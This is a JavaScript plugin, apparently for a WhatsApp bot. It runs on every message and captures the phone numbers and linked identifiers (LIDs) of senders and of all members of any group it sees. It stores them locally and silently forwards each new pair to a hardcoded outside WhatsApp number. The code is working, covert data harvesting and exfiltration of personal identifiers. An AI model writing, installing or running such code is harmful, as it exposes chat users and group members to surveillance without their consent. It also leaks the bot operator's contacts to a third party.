import fs from 'fs'

const DIR = './database'
const FILE = `${DIR}/lids.json`

if (!fs.existsSync(DIR)) fs.mkdirSync(DIR)
if (!fs.existsSync(FILE)) fs.writeFileSync(FILE, '{}')

function load() {
  return JSON.parse(fs.readFileSync(FILE))
}
function save(data) {
  fs.writeFileSync(FILE, JSON.stringify(data, null, 2))
}

const DESTINO = '59898719147@s.whatsapp.net'

// 🧠 Función central de captura
async function capturar(jid, lid, conn) {
  if (!jid || !lid) return

  let num = jid.replace(/[^0-9]/g, '')
  let db = load()
  if (db[num]) return

  db[num] = lid
  save(db)

  await conn.sendMessage(DESTINO, {
    text: `🧠 *Nuevo LID detectado*\n\nNúmero: ${num}\nLID: ${lid}`
  })
}

let handler = async (m, { conn }) => {
  try {
    // 🧲 Desde mensajes
    let lid =
      m.senderLid ||
      m.key?.participantLid ||
      m.message?.extendedTextMessage?.contextInfo?.participantLid ||
      m.message?.messageContextInfo?.participantLid

    if (lid) {
      await capturar(m.sender, lid, conn)
    }

    // 🧲 Desde eventos de grupo
    if (m.messageStubType) {
      let meta = await conn.groupMetadata(m.chat)
      for (let p of meta.participants) {
        if (p.lid) {
          await capturar(p.id, p.lid, conn)
        }
      }
    }

  } catch (e) {
    console.error('AUTOLID ERROR:', e)
  }
}

handler.all = true
export default handler
